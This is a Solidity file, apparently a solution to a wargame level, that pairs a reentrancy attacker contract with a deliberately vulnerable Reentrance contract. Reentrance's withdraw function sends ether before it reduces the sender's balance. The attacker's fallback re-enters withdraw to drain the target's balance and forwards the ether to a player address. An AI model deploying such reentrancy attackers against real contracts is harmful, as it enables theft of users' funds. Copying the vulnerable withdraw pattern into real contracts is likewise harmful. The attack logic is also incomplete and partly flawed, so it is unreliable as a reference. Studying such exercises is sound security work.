// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract PeeElephant {
    address payable targetAddress;
    Reentrance target;
    address payable player;
    constructor(address _target, address _player) {
        targetAddress = payable (_target);
        target = Reentrance(targetAddress);
        player = payable(_player);
    }

    fallback() external payable {
        //get balance of contract
        uint256 prize = address(targetAddress).balance;
        target.withdraw(prize);
        player.transfer(address(this).balance);
    }

}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}